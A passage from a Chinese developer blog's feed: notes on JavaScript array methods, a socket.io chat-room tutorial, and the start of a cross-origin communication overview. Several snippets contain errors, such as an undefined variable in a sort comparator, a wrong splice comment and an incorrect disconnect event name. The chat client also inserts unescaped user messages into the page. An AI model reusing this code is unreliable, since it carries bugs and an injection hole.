class="line"><span class="keyword">let</span> arr = [...arguments];<span class="comment">//[1,2,3]</span></span><br><span class="line">&#125;</span><br><span class="line">func(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br></pre></td></tr></table></figure><h4 id="5-查找方法"><a href="#5-查找方法" class="headerlink" title="5. 查找方法"></a>5. 查找方法</h4><p>a. indexOf()和lastIndexOf()返回指定元素的位置，会使用全等操作符(不可以正确判断NaN和NaN,+0和-0的关系)</p><p>b. es7的includes()方法，这个如果找到就返回true,但是使用的判断方法并不是全等操作符，可以正确判断NaN和NaN,+0和-0的关系;</p><p>c. find()和findIndex()方法，执行传入的回调函数，返回第一个符合条件的项/索引</p><h4 id="6-数组的栈，队列方法"><a href="#6-数组的栈，队列方法" class="headerlink" title="6. 数组的栈，队列方法"></a>6. 数组的栈，队列方法</h4><p>a. 栈，后进先出(LIFO)，push()从数组末尾推入任意项，pop()移除最后一项<br>b. 队列，先进先出(FIFO)，shift()从前端移除第一项，push()从末端添加一项<br>c. unshift()从前端增加任意项</p><h4 id="7-迭代方法"><a href="#7-迭代方法" class="headerlink" title="7. 迭代方法"></a>7. 迭代方法</h4><p> every(),filter(),forEach(),map(),some()方法，都接受2个参数，要执行的回调函数，以及该函数的执行作用域,而回调函数接受三个参数：项的值，项的索引，数组本身，它们有区别，具体省略</p><p>曾经遇到过的一个问题，看下面代码：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Score</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.scores = [];</span><br><span class="line">&#125;</span><br><span class="line">Score.prototype.add = <span class="function"><span class="keyword">function</span>(<span class="params">score</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.scores.push(score);</span><br><span class="line">&#125;;</span><br><span class="line">Score.prototype.showAverage = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> sum = <span class="keyword">this</span>.scores.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">pre,cur</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> pre+cur;</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="built_in">console</span>.log(sum*<span class="number">1.0</span>/<span class="keyword">this</span>.scores.length);</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">let</span> scores = [<span class="number">90</span>,<span class="number">80</span>,<span class="number">70</span>];</span><br><span class="line"><span class="keyword">let</span> score1 = <span class="keyword">new</span> Score();</span><br><span class="line">scores.forEach(score1.add);</span><br><span class="line">score1.showAverage();</span><br></pre></td></tr></table></figure></p><p>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">can&apos;t read property &apos;scores&apos; of undefined;</span><br></pre></td></tr></table></figure></p><p>因为，在<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scores.forEach(score1.add);</span><br></pre></td></tr></table></figure></p><p>中，存在一个赋值过程，即把score1.add赋给了forEach的内部参数的过程。所以，它相当于：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> add0 = score1.add;</span><br><span class="line">scores.forEach(add0);</span><br></pre></td></tr></table></figure></p><p>结果add里面的this就变成了undefined，所以报错了。</p><p>这样的话，可以给forEach()方法传入作用域，即Score构造函数</p><h4 id="8-排序"><a href="#8-排序" class="headerlink" title="8. 排序"></a>8. 排序</h4><p>a. 重排序方法reverse()，只是简单的将原数组倒序<br>b. sort()方法，接受一个比较函数，从而正确的对数组进行从小到大的排序:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compare</span>(<span class="params">val1,val2</span>)</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(val1&lt;value2)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(val1 &gt; val2)&#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> arr = [<span class="number">0</span>,<span class="number">8</span>,<span class="number">5</span>,<span class="number">15</span>];</span><br><span class="line"><span class="built_in">console</span>.log(arr.sort(compare));<span class="comment">//[0,5,8,15]</span></span><br></pre></td></tr></table></figure></p><p>避免不传参数时，10比5小的情况</p><h4 id="9-其他的操作方法"><a href="#9-其他的操作方法" class="headerlink" title="9. 其他的操作方法:"></a>9. 其他的操作方法:</h4><p>a. concat(),先创建一个当前数组的副本，然后将接受到的参数添加到末尾;</p><p>b. slice()，返回子数组，接受起始和结束位置，不影响原始数组</p><p>c. splice()，最强大的数组方法，任意参数，第1个:要删除项的第一个位置，第2个：删除的项数；<br>第3个以及以后：从第一个参数位置开始要插入的项。利用这个方法可以进行删除，插入，替换等操作，举个栗子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> colors = [<span class="string">'red'</span>,<span class="string">'white'</span>,<span class="string">'black'</span>,green];</span><br><span class="line"><span class="keyword">var</span> removed = colors.splice(<span class="number">2</span>,<span class="number">1</span>,<span class="string">'orange'</span>,<span class="string">'purple'</span>);<span class="comment">//black</span></span><br><span class="line"><span class="built_in">console</span>.log(colors);<span class="comment">// red,white,orange,purple,green删除了三项，并从原来第三项位置处开始插入了两项</span></span><br></pre></td></tr></table></figure></p><p>d. reduce()和reduceRight()方法，迭代所有项，返回最终值，直接上栗子:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> arr = [<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">4</span>];</span><br><span class="line"><span class="keyword">var</span> sum = arr.reduce(<span class="function"><span class="keyword">function</span>(<span class="params">prev,cur,index,array</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> prev + cur;</span><br><span class="line">&#125;);  <span class="comment">//7 计算数组每项的和</span></span><br></pre></td></tr></table></figure></p><p>e. 数组的fill()方法，使用给定值，填充数组:<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>)</span><br><span class="line"><span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>).fill(<span class="number">7</span>)</span><br><span class="line"><span class="comment">// [7, 7, 7]</span></span><br><span class="line"></span><br><span class="line">[<span class="string">'a'</span>, <span class="string">'b'</span>, <span class="string">'c'</span>].fill(<span class="number">7</span>, <span class="number">1</span>, <span class="number">2</span>)</span><br><span class="line"><span class="comment">// ['a', 7, 'c']</span></span><br></pre></td></tr></table></figure></p><p>f. 数组的copyWithin()方法<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将3号位复制到0号位</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="comment">// [4, 2, 3, 4, 5]</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// -2相当于3号位，-1相当于4号位</span></span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>].copyWithin(<span class="number">0</span>, <span class="number">-2</span>, <span class="number">-1</span>)</span><br><span class="line"><span class="comment">// [4, 2, 3, 4, 5]</span></span><br></pre></td></tr></table></figure></p><p>g. 数组实例的entries()，keys()和values()返回遍历器对象，可以用for-of循环遍历<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> [index, elem] <span class="keyword">of</span> [<span class="string">'a'</span>, <span class="string">'b'</span>].entries()) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(index, elem);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 0 "a"</span></span><br><span class="line"><span class="comment">// 1 "b"</span></span><br></pre></td></tr></table></figure></p><h4 id="10-数组的空位"><a href="#10-数组的空位" class="headerlink" title="10. 数组的空位:"></a>10. 数组的空位:</h4><p>空位并不等于undefined，es5有许多不一致的表现</p><p>forEach(), filter(), every() 和some()都会跳过空位。<br>map()会跳过空位，但会保留这个值<br>join()和toString()会将空位视为undefined，而undefined和null会被处理成空字符串。</p><p>es6视空位为undefined</p><h4 id="11-其他技巧"><a href="#11-其他技巧" class="headerlink" title="11.其他技巧"></a>11.其他技巧</h4><p>a. 数组快速去重：原理是set数据结构成员不重复<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">5</span>];</span><br><span class="line"><span class="keyword">let</span> newArr = [...new <span class="built_in">Set</span>(arr)];</span><br><span class="line"><span class="built_in">console</span>.log(newArr);<span class="comment">//[1,3,5]</span></span><br></pre></td></tr></table></figure></p><p>对于有字符串之类的情况如何：[1,3,’3’,5,’5’]如果你的目的是要让字符串转换成数值再判断，这也很好办，不过是加了处理函数罢了：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> arr = [<span class="number">1</span>,<span class="number">3</span>,<span class="string">'3'</span>,<span class="number">5</span>,<span class="string">'5'</span>];</span><br><span class="line"><span class="keyword">let</span> newArr = [...new <span class="built_in">Set</span>(arr.map(<span class="function"><span class="params">element</span>=&gt;</span><span class="built_in">parseInt</span>(element)))];</span><br><span class="line"><span class="built_in">console</span>.log(newArr);<span class="comment">//[1,3,5]</span></span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这篇文章是第一篇关于算法与数据结构的文章，有关于数组，后续会有系列性的更新与算法与数据结构有关的文章，其中包括es6的扩展方法&lt;br&gt;
    
    </summary>
    
      <category term="数据结构与算法" scheme="http://luoxia.me/code/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E4%B8%8E%E7%AE%97%E6%B3%95/"/>
    
    
      <category term="JavaScript" scheme="http://luoxia.me/code/tags/JavaScript/"/>
    
      <category term="数据结构" scheme="http://luoxia.me/code/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
      <category term="算法" scheme="http://luoxia.me/code/tags/%E7%AE%97%E6%B3%95/"/>
    
      <category term="数组" scheme="http://luoxia.me/code/tags/%E6%95%B0%E7%BB%84/"/>
    
  </entry>
  
  <entry>
    <title>基于socket.io的聊天应用</title>
    <link href="http://luoxia.me/code/2016/06/01/%E5%9F%BA%E4%BA%8Esocket-io%E7%9A%84%E8%81%8A%E5%A4%A9%E5%BA%94%E7%94%A8/"/>
    <id>http://luoxia.me/code/2016/06/01/基于socket-io的聊天应用/</id>
    <published>2016-06-01T14:07:31.000Z</published>
    <updated>2017-11-16T13:10:06.491Z</updated>
    
    <content type="html"><![CDATA[<p>WebSocket是HTML5的一种新通信协议，它实现了浏览器与服务器之间的双向通讯。而Socket.IO是一个完全由JavaScript实现、基于Node.js、支持WebSocket的协议用于实时通信、跨平台的开源框架，它包括了客户端的JavaScript和服务器端的Node.js。</p><p>本文记录利用socket.io开发聊天室的实践<br><img src="http://7xsi10.com1.z0.glb.clouddn.com/user1.png" alt="user1"><br><a id="more"></a></p><h5 id="Socket-IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket-IO实现的Polling通信机制包括Adobe-Flash-Socket、AJAX长轮询、AJAX-multipart-streaming、持久Iframe、JSONP轮询等。Socket-IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。"><a href="#Socket-IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket-IO实现的Polling通信机制包括Adobe-Flash-Socket、AJAX长轮询、AJAX-multipart-streaming、持久Iframe、JSONP轮询等。Socket-IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。" class="headerlink" title="Socket.IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket.IO实现的Polling通信机制包括Adobe Flash Socket、AJAX长轮询、AJAX multipart streaming、持久Iframe、JSONP轮询等。Socket.IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。"></a>Socket.IO除了支持WebSocket通讯协议外，还支持许多种轮询（Polling）机制以及其它实时通信方式，并封装成了通用的接口，并且在服务端实现了这些实时机制的相应代码。Socket.IO实现的Polling通信机制包括Adobe Flash Socket、AJAX长轮询、AJAX multipart streaming、持久Iframe、JSONP轮询等。Socket.IO能够根据浏览器对通讯机制的支持情况自动地选择最佳的方式来实现网络实时应用。</h5><h4 id="a-需要依赖的模块"><a href="#a-需要依赖的模块" class="headerlink" title="a. 需要依赖的模块"></a>a. 需要依赖的模块</h4><ol><li>客户端jquery</li><li>express</li><li>express的静态文件服务</li><li>http模块</li><li>socket.io</li></ol><h5 id="Nodejs服务端server-js"><a href="#Nodejs服务端server-js" class="headerlink" title="Nodejs服务端server.js:"></a>Nodejs服务端server.js:</h5><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> app = <span class="built_in">require</span>(<span class="string">'express'</span>)();</span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">'http'</span>).Server(app);</span><br><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http);</span><br><span class="line"><span class="keyword">var</span> staticServer = <span class="built_in">require</span>(<span class="string">'express-static'</span>);</span><br></pre></td></tr></table></figure><h5 id="客户端引入socket-io包的soket-io-js"><a href="#客户端引入socket-io包的soket-io-js" class="headerlink" title="客户端引入socket.io包的soket.io.js"></a>客户端引入socket.io包的soket.io.js</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"./socket.io.js"</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="b-客户端-index-html"><a href="#b-客户端-index-html" class="headerlink" title="b. 客户端 index.html"></a>b. 客户端 index.html</h4><h5 id="界面以清新简约为主，此处省略样式代码，最终界面效果如下："><a href="#界面以清新简约为主，此处省略样式代码，最终界面效果如下：" class="headerlink" title="界面以清新简约为主，此处省略样式代码，最终界面效果如下："></a>界面以清新简约为主，此处省略样式代码，最终界面效果如下：</h5><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/chatUI.png" alt="UI"></p><h5 id="来看几个客户端socket-io的API"><a href="#来看几个客户端socket-io的API" class="headerlink" title="来看几个客户端socket.io的API:"></a>来看几个客户端socket.io的API:</h5><ol><li>io(String url,Obj opts) 暴露于window下，可传入建立连接的url字符串和用于设置连接的对象，如果不设置url,则默认建立到位客户端提供服务的服务器根目录</li><li>emmit()事件机制，触发某个事件</li></ol><h5 id="index-html"><a href="#index-html" class="headerlink" title="index.html:"></a>index.html:</h5><ol><li><p>建立连接:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> socket = io();</span><br></pre></td></tr></table></figure></li><li><p>触发服务端用户加入事件join:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">socket.emit(<span class="string">'join'</span>,name);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">3. 消息发送，触发服务端消息发送事件text:</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">socket.emit(<span class="string">'text'</span>,$(<span class="string">'#msg'</span>).val());</span><br></pre></td></tr></table></figure></li><li><p>监听由服务器当其他用户加入时触发的announcement事件,通知新用户加入:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'announcement'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">            $(<span class="string">'.otherEnter ul'</span>).append(<span class="string">'&lt;li&gt;'</span>+msg+<span class="string">'&lt;/li&gt;'</span>);</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li><li><p>监听由服务端当其他用户有消息发送时触发的text事件，将新消息加入显示:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'text'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">content</span>)</span>&#123;</span><br><span class="line">            $(<span class="string">'.chatList ul'</span>).append(<span class="string">'&lt;li&gt;'</span>+ content +<span class="string">'&lt;/li&gt;'</span>);</span><br><span class="line">        &#125;);</span><br></pre></td></tr></table></figure></li><li><p>自己发的消息要在触发服务器text事件之前显示,因为socket.io广播是默认不给本用户触发指定事件的:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="string">'.chatList ul'</span>).append(<span class="string">'&lt;li&gt;&lt;span&gt;me&lt;/span&gt;:'</span>+$(<span class="string">'#msg'</span>).val()+<span class="string">'&lt;/li&gt;'</span>)</span><br><span class="line">            socket.emit(<span class="string">'text'</span>,$(<span class="string">'#msg'</span>).val());</span><br></pre></td></tr></table></figure></li></ol><h4 id="c-服务端-server-js"><a href="#c-服务端-server-js" class="headerlink" title="c. 服务端 server.js"></a>c. 服务端 server.js</h4><ol><li>建立静态文件服务器，用到express-static中间件:<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.use(staticServer(<span class="string">'./'</span>));</span><br><span class="line">app.get(<span class="string">'/'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">req,res</span>)</span>&#123;</span><br><span class="line">    res.render(<span class="string">'index'</span>);</span><br><span class="line">&#125;);</span><br><span class="line">http.listen(<span class="number">8068</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">"Sever has been listened at port 8068"</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/chatServer.png" alt="server"></p><ol><li><p>将http服务绑定到socket.io服务:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> io = <span class="built_in">require</span>(<span class="string">'socket.io'</span>)(http);</span><br></pre></td></tr></table></figure></li><li><p>监听connection事件，当有新连接时触发:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.on(<span class="string">"connection"</span>,<span class="function"><span class="keyword">function</span>(<span class="params">socket</span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"some on connected"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/chatconnect.png" alt="connect"></p><ol><li><p>新用户连接:join事件,var total = 0;用于统计在线人数,每次新用户加入，通知其他所有用户，并完成total的更新，这就要用到socket.io的广播了，通过.broadcast来进行广播:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">total++;</span><br><span class="line"><span class="built_in">console</span>.log(name+<span class="string">"joined"</span>);</span><br><span class="line">socket.broadcast.emit(<span class="string">'announcement'</span>,name+<span class="string">' joined in'</span>);</span><br><span class="line">socket.broadcast.emit(<span class="string">'totalChange'</span>,total);  <span class="comment">//广播用户总数改变事件</span></span><br></pre></td></tr></table></figure></li><li><p>当某个链接断开时，需要通知其他用户，total更新,socket.io的disconnect事件，当链接断开时触发:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">socket.on(<span class="string">'disconnection'</span>,<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        total--;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">'hi,leave'</span>);</span><br><span class="line">        socket.broadcast.emit(<span class="string">'announcement'</span>,name+<span class="string">' leved away'</span>);</span><br><span class="line">        socket.broadcast.emit(<span class="string">'totalChange'</span>,total);</span><br><span class="line">    &#125;);</span><br><span class="line"><span class="string">``</span><span class="string">`</span></span><br><span class="line"><span class="string">6. 广播聊天内容:</span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line">socket.on(<span class="string">'text'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">msg</span>)</span>&#123;</span><br><span class="line">    socket.broadcast.emit(<span class="string">'text'</span>,<span class="string">'&lt;span&gt;'</span>+name+<span class="string">'&lt;/span&gt;'</span>+<span class="string">':'</span>+msg);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure></li></ol><h4 id="最终测试效果如下："><a href="#最终测试效果如下：" class="headerlink" title="最终测试效果如下："></a>最终测试效果如下：</h4><p><img src="http://7xsi10.com1.z0.glb.clouddn.com/user1.png" alt="user1"><br><img src="http://7xsi10.com1.z0.glb.clouddn.com/user2.png" alt="user2"><br><img src="http://7xsi10.com1.z0.glb.clouddn.com/user3.png" alt="user3"></p><p>正如截图中的旁白君所说，应用还有bug和需要改善的地方，所以这篇文章会继续更新！<br>有兴趣的，可以到我的github查看应用全部源码:<br><a href="https://github.com/laoqiren/socket.io-demo" target="_blank" rel="noopener">我的github</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;WebSocket是HTML5的一种新通信协议，它实现了浏览器与服务器之间的双向通讯。而Socket.IO是一个完全由JavaScript实现、基于Node.js、支持WebSocket的协议用于实时通信、跨平台的开源框架，它包括了客户端的JavaScript和服务器端的Node.js。&lt;/p&gt;
&lt;p&gt;本文记录利用socket.io开发聊天室的实践&lt;br&gt;&lt;img src=&quot;http://7xsi10.com1.z0.glb.clouddn.com/user1.png&quot; alt=&quot;user1&quot;&gt;&lt;br&gt;
    
    </summary>
    
      <category term="Nodejs" scheme="http://luoxia.me/code/categories/Nodejs/"/>
    
    
      <category term="socket.io" scheme="http://luoxia.me/code/tags/socket-io/"/>
    
      <category term="websocket" scheme="http://luoxia.me/code/tags/websocket/"/>
    
  </entry>
  
  <entry>
    <title>跨域通信总结</title>
    <link href="http://luoxia.me/code/2016/05/19/%E8%B7%A8%E5%9F%9F%E9%80%9A%E4%BF%A1%E6%80%BB%E7%BB%93/"/>
    <id>http://luoxia.me/code/2016/05/19/跨域通信总结/</id>
    <published>2016-05-19T15:01:53.000Z</published>
    <updated>2017-11-16T13:10:06.493Z</updated>
    
    <content type="html"><![CDATA[<p>由于出于安全方面的考虑，JavaScript有着跨源策略的限制，也就是某个域的网页只能对同域进行访问。本文记录几种跨域实现及我自己的实践。</p><h4 id="本文总结以下方式实现跨域通信："><a href="#本文总结以下方式实现跨域通信：" class="headerlink" title="本文总结以下方式实现跨域通信："></a>本文总结以下方式实现跨域通信：</h4><ol><li>代理服务器</li><li>图像Ping</li><li>iframe技术（iframe+document.domain;iframe+location.hash)</li><li>window.name</li><li>HTML5跨文档消息传递(XDM)</li><li>JSONP</li><li>CORS(跨站资源共享)<a id="more"></a><h3 id="1-代理"><a href="#1-代理" class="headerlink" title="1. 代理"></a>1. 代理</h3></li></ol><p>所谓代理，就是用后台技术实现代理服务器，前端访问代理服务器，代理服务器向实际服务器发起请求，拿到数据再返回给前端。 例如一个网站有两个服务器www.Chongqing.com和www.Hangzhou.com，在杭州的话想访问重庆服务器的资源，先直接访问杭州服务器，杭州服务器再从重庆服务器拉取数据最后返回给杭州的user-agent.</p><h3 id="2-图像ping"><a href="#2-图像ping" class="headerlink" title="2. 图像ping"></a>2. 图像ping</h3><h4 id="虽然js有同源现在，但是，在html里有几个元素可以没有限制的访问任何网站的内容，比如-img-iframe-script-，哈哈哈哈哈哈，那么，就可以利用这一点实现跨域咯。"><a href="#虽然js有同源现在，但是，在html里有几个元素可以没有限制的访问任何网站的内容，比如-img-iframe-script-，哈哈哈哈哈哈，那么，就可以利用这一点实现跨域咯。" class="headerlink" title="虽然js有同源现在，但是，在html里有几个元素可以没有限制的访问任何网站的内容，比如 img,iframe,script  ，哈哈哈哈哈哈，那么，就可以利用这一点实现跨域咯。"></a>虽然js有同源现在，但是，在html里有几个元素可以没有限制的访问任何网站的内容，比如 img,iframe,script  ，哈哈哈哈哈哈，那么，就可以利用这一点实现跨域咯。</h4><p>图像ping用于客户端和服务端进行单向的简单的通信,只能发送get请求，无法访问服务器响应文本，在这里不详解；<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'http://www.luoxia520.com?name=luoxia'</span>;</span><br></pre></td></tr></table></figure></p><h3 id="3-iframe"><a href="#3-iframe" class="headerlink" title="3. iframe"></a>3. iframe</h3><h4 id="iframe-document-domain"><a href="#iframe-document-domain" class="headerlink" title="iframe+document.domain:"></a>iframe+document.domain:</h4><p>对于来自同一域名下的不同子域名，可以通过设置document.domain为相同值来实现跨域通信：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//www.luoxia520.com和p2p.luoxia520.com</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//在两者的index.html下设置:</span></span><br><span class="line"><span class="built_in">document</span>.domain = <span class="string">'luoxia520.com'</span>;</span><br></pre></td></tr></table></figure></p><p>然后就可以通过內建iframe操作异域的对象了:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//www.luoxia520.com</span></span><br><span class="line"><span class="keyword">var</span> ifr = <span class="built_in">document</span>.createElement(<span class="string">'iframe'</span>);</span><br><span class="line">ifr.src = <span class="string">'prp.luoxia520.com'</span>;</span><br><span class="line">ifr.syle.display = <span class="string">'none'</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(ifr);</span><br><span class="line"><span class="keyword">var</span> otherDoc = 